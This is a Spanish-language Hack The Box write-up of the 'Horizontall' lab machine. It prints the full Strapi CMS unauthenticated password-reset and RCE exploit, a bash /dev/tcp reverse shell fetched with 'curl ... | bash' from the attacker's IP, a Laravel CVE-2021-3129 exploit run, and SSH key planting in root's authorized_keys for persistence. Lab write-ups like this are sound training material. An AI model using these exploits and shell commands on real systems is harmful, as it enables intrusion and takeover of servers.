---
title: Horizontall HTB Write-up
categories: [Write up, Hack The Box]
tags: [Enumeration, Fuzzing, Web, RCE, CMS, Port forwarding, Exploit, Linux, Easy]
pin: false
math: true
mermaid: true
---

<img src="/imagenes/Horizontall/Horizontall_banner.png"  width="550" height="250">


## Resumen

Saludos, en esta oportunidad vamos a resolver la máquina de **Hack The Box** llamada **Horizontall**, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:

*   **Enumeración del sistema con nmap.**
*   **Inspección de código fuente de página para encontrar subdominios.**
*   **Fuzzing para encontrar directorios en página web.**
*   **Vulnerabilidad en CMS strapi (RCE).**
*   **Port forwarding utilizando ssh.**
*   **Vulnerabilidad en Laravel (RCE).**


## Reconocimiento y Enumeración

En primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando `ping`:

```
ping -c 1 10.10.11.105

PING 10.10.11.105 (10.10.11.105) 56(84) bytes of data.
64 bytes from 10.10.11.105: icmp_seq=1 ttl=63 time=145 ms
```
Se observa que existe una correcta conexión con la máquina.

Para realizar un reconocimiento activo se utilizará la herramienta `nmap`, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro `-sS` el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):

```
sudo nmap -p- -sS -open -min-rate 5000 10.10.11.105 -oG Ports
```
Al finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima: 
```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
Realizamos un escaneo de los servicios expuestos utilizando `nmap`:

```
sudo nmap -sCV -p22,80 10.10.11.105 -oN ServiceScan
```

Como resultado del escaneo tenemos:

```
ORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ee774143d482bd3e6e6e50cdff6b0dd5 (RSA)
|   256 3ad589d5da9559d9df016837cad510b0 (ECDSA)
|_  256 4a0004b49d29e7af37161b4f802d9894 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Observamos que hay un servidor web, en primer lugar utilizaremos la herramienta `whatweb` para enumerar información:

```
whatweb 10.10.11.105

http://10.10.11.105 [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], RedirectLocation[http://horizontall.htb], Title[301 Moved Permanently], nginx[1.14.0]
http://horizontall.htb [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.14.0 (Ubuntu)], IP[10.10.11.105], Script, Title[horizontall], X-UA-Compatible[IE=edge], nginx[1.14.0]
```

Observamos un redirect hacia **horizontall.htb**, abriremos el **/etc/hosts** para ingresar esta dirección para que pueda resolver correctamente:

```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.105    horizontall.htb
```

Luego, abrimos nuestro navegador para observar que hay en esta página:


![](/imagenes/Horizontall/horizontall.png)

Si analizamos la página e intentamos navegar por ella nos damos cuenta que es solo una página estática, sin embargo, utilizaremos la herramienta `wfuzz` para buscar directorios:

```
wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 horizontall.htb/FUZZ

ID           Response   Lines    Word       Chars       Payload                                                                                                                                           
=====================================================================

000000001:   200        1 L      43 W       901 Ch      "# directory-list-2.3-medium.txt"                                                                                                                 
000000003:   200        1 L      43 W       901 Ch      "# Copyright 2007 James Fisher"                                                                                                                   
000000007:   200        1 L      43 W       901 Ch      "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"                                                                                 
000000002:   200        1 L      43 W       901 Ch      "#"                                                                                                                                               
000000013:   200        1 L      43 W       901 Ch      "#"                                                                                                                                               
000000039:   301        7 L      13 W       194 Ch      "img"                                                                                                                                             
000000005:   200        1 L      43 W       901 Ch      "# This work is licensed under the Creative Commons"                                                                                              
000000004:   200        1 L      43 W       901 Ch      "#"                                                                                                                                               
000000008:   200        1 L      43 W       901 Ch      "# or send a letter to Creative Commons, 171 Second Street,"                                                                                      
000000010:   200        1 L      43 W       901 Ch      "#"                                                                                                                                               
000000006:   200        1 L      43 W       901 Ch      "# Attribution-Share Alike 3.0 License. To view a copy of this"                                                                                   
000000011:   200        1 L      43 W       901 Ch      "# Priority ordered case sensative list, where entries were found"                                                                                
000000014:   200        1 L      43 W       901 Ch      "http://horizontall.htb/"                                                                                                                         
000000012:   200        1 L      43 W       901 Ch      "# on atleast 2 different hosts"                                                                                                                  
000000009:   200        1 L      43 W       901 Ch      "# Suite 300, San Francisco, California, 94105, USA."                                                                                             
000000550:   301        7 L      13 W       194 Ch      "css"                                                                                                                                             
000000953:   301        7 L      13 W       194 Ch      "js"                                                                                                                                              
000045240:   200        1 L      43 W       901 Ch      "http://horizontall.htb/"   
```

Sin embargo, no reportó nada especial. Vamos a revisar el código fuente de la página:

![](/imagenes/Horizontall/horizontall2.png)


Observamos que el código está en una sola linea, lo que dificulta su lectura, si buscamos en la web html pretty online encontramos una web que nos puede ordenar el código:

![](/imagenes/Horizontall/horizontall3.png)


Nos vemos demasiadas cosas, sin embargo, no tenemos más opción que buscar por los archivos .js por información, abriremos el primer archiv .js llamado **js/app.c68eb462.js**:


![](/imagenes/Horizontall/horizontall4.png)

Podemos ver el código js, si lo vamos revisando rápido, observamos algo interesante:
```
var t=this;r.a.get("http://api-prod.horizontall.htb/reviews")
```

Tenemos un subdominio, por lo tanto, lo incluiremos en el /etc/hosts:

```
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.105    horizontall.htb api-prod.horizontall.htb
```

Al ingresar a la web vemos lo siguiente:

![](/imagenes/Horizontall/horizontall5.png)

En este punto haremos fuzzing utilizando wfuzz para descubrir directorios de interés:

```
wfuzz -c --hc=404 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://api-prod.horizontall.htb/FUZZ
```

Encontramos 2 directorios:
```
000000259:   200        16 L     101 W      854 Ch  "admin"                                                                                                                                           
000001609:   200        0 L      21 W       507 Ch      "Reviews"    
```

El **admin** y **Reviews**, vamos a inspecionarlos, para **Reviews**:

![](/imagenes/Horizontall/horizontall7.png)

Para **admin**:

![](/imagenes/Horizontall/horizontall6.png)


Observamos un panel de autenticación, corresponde a un CMS llamado **strapi**, si buscamos vulnerabilidades con la herramienta `searchsploit`, tenemos:

```
searchsploit strapi

--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                   |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                                                                                               | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                                                                                             | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                                                                                       | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                                                                                         | nodejs/webapps/50716.rb
```


## Explotación


Observamos que existe un exploit para ejecución remota de comandos sin estar autenticado, esto parece prometedor, vamos a inspeccionarlo:

```python
# Exploit Title: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
# Date: 2021-08-30
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://strapi.io/
# Software Link: https://strapi.io/
# Version: Strapi CMS version 3.0.0-beta.17.4 or lower
# Tested on: Ubuntu 20.04
# CVE : CVE-2019-18818, CVE-2019-19609

#!/usr/bin/env python3

import requests
import json
from cmd import Cmd
import sys

if len(sys.argv) != 2:
    print("[-] Wrong number of arguments provided")
    print("[*] Usage: python3 exploit.py <URL>\n")
    sys.exit()


class Terminal(Cmd):
    prompt = "$> "
    def default(self, args):
        code_exec(args)

def check_version():
    global url
    print("[+] Checking Strapi CMS Version running")
    version = requests.get(f"{url}/admin/init").text
    version = json.loads(version)
    version = version["data"]["strapiVersion"]
    if version == "3.0.0-beta.17.4":
        print("[+] Seems like the exploit will work!!!\n[+] Executing exploit\n\n")
    else:
        print("[-] Version mismatch trying the exploit anyway")


def password_reset():
    global url, jwt
    session = requests.session()
    params = {"code" : {"$gt":0},
            "password" : "SuperStrongPassword1",
            "passwordConfirmation" : "SuperStrongPassword1"
            }
    output = session.post(f"{url}/admin/auth/reset-password", json = params).text
    response = json.loads(output)
    jwt = response["jwt"]
    username = response["user"]["username"]
    email = response["user"]["email"]

    if "jwt" not in output:
        print("[-] Password reset unsuccessfull\n[-] Exiting now\n\n")
        sys.exit(1)
    else:
        print(f"[+] Password reset was successfully\n[+] Your email is: {email}\n[+] Your new credentials are: {username}:SuperStrongPassword1\n[+] Your authenticated JSON Web Token: {jwt}\n\n")
def code_exec(cmd):
    global jwt, url
    print("[+] Triggering Remote code executin\n[*] Rember this is a blind RCE don't expect to see output")
    headers = {"Authorization" : f"Bearer {jwt}"}
    data = {"plugin" : f"documentation && $({cmd})",
            "port" : "1337"}
    out = requests.post(f"{url}/admin/plugins/install", json = data, headers = headers)
    print(out.text)

if __name__ == ("__main__"):
    url = sys.argv[1]
    if url.endswith("/"):
        url = url[:-1]
    check_version()
    password_reset()
    terminal = Terminal()
    terminal.cmdloop()
```

Obsevamos que tiene diferentes funciones, la primera se encarga de verificar la versión de strapi para ver si es vulnerable o no a este exploit. El funcionamiento de este radica en que se puede cambiar la contraseña de administrador en la ruta **admin/auth/reset-password** sin necesidad de estar autenticado, lo que permite hacerse con el nombre de usuario y contraseña (que tu le cambiaste) fácilemente. Luego, utilizando el token **jwt** realiza una petición post hacia **/admin/plugins/install**, en la cual viaja el comando que queremos ejecutar, haciendo que esto se instale como un plugin, haciendo de esta forma posible el **RCE**.

Probemos este exploit a ver si funciona:


```
python3 50239.py http://api-prod.horizontall.htb
[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjc1OTc5NTUxLCJleHAiOjE2Nzg1NzE1NTF9.wl6vOWotK3bscBZJm5PuK8fBmoKsZCxByEwD9iYTizo


$> 
```

Ha funcionado, tenemos capacidad de ejecutar comandos en la máquina víctima, ahora intentaremos ganar acceso enviando una shell reversa hacia nuestro equipo. Intentando con varias formas de hacerlo, resultó la siguiente:

En primer lugar, estaremos escuchando por `netcat` por el puerto 1235:

```
nc -nvlp 1235
listening on [any] 1235 ...
```

Luego, utilizando python utilizaremos el modulo **http.server** para compartir el siguiente archivo .html:

```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.17/1235 0>&1
```
El cual entablará la conexión reversa a nuestro equipo.

Finalmente, en la máquina víctima haremos un `curl` a nuestro servidor http y luego, ejecutar ese contenido con **bash**:
```
curl http://10.10.14.17/ | bash
```
De esta manera, el servidor en python recibe una petición:

```
python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.11.105 - - [09/Feb/2023 17:10:37] "GET / HTTP/1.1" 200 -

```
Y por el `netcat` recibimos la reverse shell:

```
nc -nvlp 1235
listening on [any] 1235 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.105] 43042
bash: cannot set terminal process group (1935): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$ whoami
whoami
strapi
```

Observamos que estamos dentro de la máquina víctima y somos el usuario **strapi**.

Buscamos la flag de usuario:
```
strapi@horizontall:/home/developer$ cat user.txt
cat user.txt
9e65474e1f6d52164d71ed95
```

Excelente, tenemos la flag del usuario **strapi**.

## Escalada de privilegios

Vemos los grupos a los que pertenecemos:

```
strapi@horizontall:/home/developer$ id
id
uid=1001(strapi) gid=1001(strapi) groups=1001(strapi)
```

Buscamos si tenemos algún permiso **SUID**:
```
strapi@horizontall:/$ find \-perm -4000 2>/dev/null
find \-perm -4000 2>/dev/null
./usr/bin/sudo
./usr/bin/newgidmap
./usr/bin/traceroute6.iputils
./usr/bin/newuidmap
./usr/bin/gpasswd
./usr/bin/at
./usr/bin/chfn
./usr/bin/passwd
./usr/bin/newgrp
./usr/bin/pkexec
./usr/bin/chsh
./usr/lib/openssh/ssh-keysign
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
./usr/lib/eject/dmcrypt-get-device
./usr/lib/snapd/snap-confine
./usr/lib/policykit-1/polkit-agent-helper-1
./bin/fusermount
./bin/ping
./bin/su
./bin/umount
./bin/mount
```
Pero no hay nada relevante, bueno no, está el pkexec, sin embargo, no haremos esa escalada.

Buscaremos los puertos abiertos que tenemos en la máquina:

```
strapi@horizontall:/$ netstat -nat
netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN     
tcp        0     13 10.10.11.105:43042      10.10.14.17:1235        ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN   
```

Observamos puertos abiertos en la máquina localmente, el primero puerto que vemos es el 8000, hacemos un curl para ver si es una página web:

```
curl localhost:8000
```
Observamos muchas información y si parece ser una web, por lo tanto, vamos a realizar un **port-forwarding** utilizando `ssh` para traer el puerto 8000 de la máquina víctima a nuestro equipo y tener conexión. En primer lugar, creamos un directorio .ssh para el usuario, pues no tiene:
```
mkdir .ssh
```
Dentro de este directorio crearemos un archivo que será la llave, en nuestro equipo usaremos `ssh-key` para generar una clave `ssh`:

```
ssh-keygen -f strapi
```
De esta forma obtenemos la llave pública y privada, copiaremos la llave pública creada en el directorio .ssh de la máquina víctima con el nombre de **authorized_keys**:

```
strapi@horizontall:~/.ssh$ ls
authorized_keys
```

Le otorgamos el permiso 600, pues es necesario que se reconozca como llave:

```
strapi@horizontall:~/.ssh$ chmod 600 authorized_keys
```

Hacemos lo mismo con la llave en nuestro equipo e intentamos conectarnos a través de `ssh` con la llave privada:

```
ssh -i strapi strapi@10.10.11.105
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 10 03:09:59 UTC 2023

  System load:  0.11              Processes:           180
  Usage of /:   83.1% of 4.85GB   Users logged in:     0
  Memory usage: 47%               IP address for eth0: 10.10.11.105
  Swap usage:   0%


0 updates can be applied immediately.


Last login: Fri Jun  4 11:29:42 2021 from 192.168.1.15
$ bash
strapi@horizontall:~$ 
```

Hemos entrado correctamente a través de `ssh` y no tenemos que volver a realizar la vulnerabilidad para entrar.

En este punto es cuando realizaremos el **port forwarding**:

```
ssh -i strapi -L 8001:127.0.0.1:8000 strapi@10.10.11.105
```

Esto realizará una conexión a nuestro puerto 8001 con el puerto 8000 de la máquina.

Luego, si vamos a nuestro localhost veremos lo siguiente:

![](/imagenes/Horizontall/horizontall8.png)


Observamos la página de **Laravel**, hemos hecho correctamente la conexión.

En este punto, buscamos vulnerabilidades de **Laravel** en **github** y encontramos [exploit](https://github.com/nth347/CVE-2021-3129_exploit), lo clonamos y vemos la forma de usarlo **./exploit.py http://localhost:8000 Monolog/RCE1 whoami**, lo intentamos con nuestras direcciones:

```
python3 exploit.py http://127.0.0.1:8001 Monolog/RCE1 whoami
[i] Trying to clear logs
[+] Logs cleared
[i] PHPGGC not found. Cloning it
Cloning into 'phpggc'...
remote: Enumerating objects: 3515, done.
remote: Counting objects: 100% (1061/1061), done.
remote: Compressing objects: 100% (465/465), done.
remote: Total 3515 (delta 624), reused 873 (delta 537), pack-reused 2454
Receiving objects: 100% (3515/3515), 516.75 KiB | 1.89 MiB/s, done.
Resolving deltas: 100% (1496/1496), done.
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

root
```

Observamos que si es vulnerable y el exploit ha funcionado, tenemos un **RCE**. En este punto enviaremos el mismo comando que hicimos con el exploit anterior con `netcat` escuchando y el servidor en python con el recurso reverse shell activo:

```
python3 exploit.py http://127.0.0.1:8001 Monolog/RCE1 'curl http://10.10.14.17/ | bash'
```

Si observamos nuestro `netcat` y obtenemos una conexión:
```
nc -nvlp 1235
listening on [any] 1235 ...
connect to [10.10.14.17] from (UNKNOWN) [10.10.11.105] 46862
bash: cannot set terminal process group (2670): Inappropriate ioctl for device
bash: no job control in this shell
root@horizontall:/home/developer/myproject/public# cd
cd
```
En este punto ingresamos la llave pública al directorio .ssh de root como authorized_keys:
```
root@horizontall:~# ls
ls
boot.sh
pid
restart.sh
root.txt
root@horizontall:~# cd .ssh
cd .ssh
root@horizontall:~/.ssh# echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzAA3JYqVn5OLwxPgPeY2KjqedY9dyAvAFRSCeiIch44xqb/DeYql+BM2TRTI03M3kk4k2Cf33ilPg/7aoTlnSnsGkt2RADKWus33roioW2vcOTVAJXvekye10FgehJEMLSWVcrn5Fz9ZE5ZKe/Cr6gE2Hmm80SxoBQV9QlQcPvUSIROHa7CPAiJIivlaHpxl94l7EBcm+cNVCcrDN5b41FobaRryd5na/quK4/buph7MYKuASCJQQI9SJu9iIBHgBZLb871qBR3riCGlHZO4XNAFb04bsNK2XRfLInGHOl1vkZjROedJ/9MgEJrxmH1HRILZEL8dJMmoCUoecCi8sT2fMGA4InDCngIl5TpediHcsOF51xWMgTlVfhX9jPu+mZD2Odmr1awb7UyDub0QZp9KsxOF9POtAJVH6L6ZA5qyDxSaP/4GzWe9yba3BYJE5TlgyBDvCl6xzVXKAlI2Gxvo8gMo4xYbCaUCS8qhk/03yna19+16LbYhkb44+Zc8= kali@kali
<8gMo4xYbCaUCS8qhk/03yna19+16LbYhkb44+Zc8= kali@kali
> ' > authorized_keys
' > authorized_keys
root@horizontall:~/.ssh# chmod 600 authorized_keys
chmod 600 authorized_keys
```

Luego, utilizando ssh volvemos a entrar, pero esta vez como el usuario root:

```
ssh -i strapi root@10.10.11.105
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-154-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri Feb 10 04:02:40 UTC 2023

  System load:  0.0               Processes:           174
  Usage of /:   82.0% of 4.85GB   Users logged in:     0
  Memory usage: 25%               IP address for eth0: 10.10.11.105
  Swap usage:   0%


0 updates can be applied immediately.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug 23 11:27:49 2021 from 10.10.14.6
root@horizontall:~# ls
boot.sh  pid  restart.sh  root.txt
root@horizontall:~# cat root.txt
73e15d3a03d555d83f71c0
```
¡Bien! Tenemos la flag de administrador, hemos vulnerado completamente la máquina.

Nos vemos, hasta la próxima.

